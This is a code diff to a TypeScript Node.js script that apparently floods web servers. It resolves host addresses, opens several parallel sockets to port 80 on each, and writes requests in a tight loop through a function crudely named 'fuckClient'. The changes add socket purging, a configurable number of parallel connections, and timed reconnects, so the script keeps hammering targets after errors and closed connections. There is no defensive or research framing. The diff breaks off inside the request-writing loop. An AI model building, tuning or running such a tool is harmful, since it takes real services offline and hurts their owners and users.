@@ -14,13 +14,24 @@ class Target {
     }
     public socket:net.Socket | null = null;
     public madeRequests:number = 0;
+    
+    public purge() {
+        if (!this.socket) {
+            return;
+        }
+        
+        this.socket.destroy();
+        this.socket = null;
+        this.madeRequests = 0;
+    }
 }
 
 let queue = new Set<Target>();
 let ardessesSet = new Set<string>();
+let parallellRequestsForHost = 3;
 
 console.log('hello');
-// for (let i = 0; i < 10; i++) {
+// for (let i = 0; i < parallellRequestsForHost; i++) {
 //     queue.add(new Target("127.0.0.1", 8557));
 // }
 
@@ -38,13 +49,11 @@ function doDig() {
             if (!ardessesSet.has(addr)) {
                 console.log(addr);
                 ardessesSet.add(addr);
-                for (let i = 0; i < 10; i++) {
+                for (let i = 0; i < parallellRequestsForHost; i++) {
                     queue.add(new Target(addr, 80));
                 }
             }
         }
-        
-        // console.log(adresses.join(', '));
     })
     .catch((err: any) => {
         console.log('Error:', err);
@@ -77,16 +86,11 @@ setInterval(()=>{
 }, 10);
 
 function run(target:Target) {
-    if (target.socket) {
-        let prevSocket = target.socket;
-        prevSocket.destroy(); 
-        target.madeRequests = 0;
-    }
     var socket = new net.Socket();
     target.socket = socket;
     queue.delete(target);
     socket.connect(target.port, target.ip, function() {
-        // console.log('Connected');
+        // console.log('Connected ' + target.ip);
         fuckClient(target);
     });
     
@@ -95,31 +99,42 @@ function run(target:Target) {
         let oks = data.toString().split("200").length - 1 ;
         totalRequestsConfirmed += oks;
         inProgress -= oks;
-        // client.destroy(); // kill client after server's response
     });
     
     socket.on('drain', function() {
         // console.log('drain');
         drains++;
         fuckClient(target);
-        // client.destroy(); // kill client after server's response
     });
 
     socket.on('close', function() {
         closes++;
         // console.log('Connection closed');
-        queue.add(target);
+        target.purge();
+        setTimeout(()=>{
+            queue.add(target);
+        }, 500);
+        
     });
     
     socket.on('error', function(err) {
         errors++;
-        queue.add(target);
+        target.purge();
+        setTimeout(()=>{
+            queue.add(target);
+        }, 500);
     });
 }
 
 function fuckClient(target:Target) {
     let writeResult = false;
     do {
+        if (!target.socket) {
+            setTimeout(()=>{
+                queue.add(target);
+            }, 500);
+            return;
+        }
         inProgress++;
         counter++;
         totalRequestsMade++;
